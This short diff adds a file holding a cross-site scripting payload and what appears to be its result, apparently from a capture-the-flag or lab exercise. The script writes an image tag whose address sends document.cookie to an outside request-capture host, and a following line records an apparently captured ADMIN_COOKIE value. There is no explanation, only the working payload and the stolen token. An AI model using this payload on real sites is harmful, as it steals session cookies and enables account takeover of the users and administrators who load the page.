@@ -1,0 +1,3 @@
+<script> document.write("<img src='http://alleddd.proxy.beeceptor.com/"+document.cookie+"'></img>"); </script>
+
+/ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6
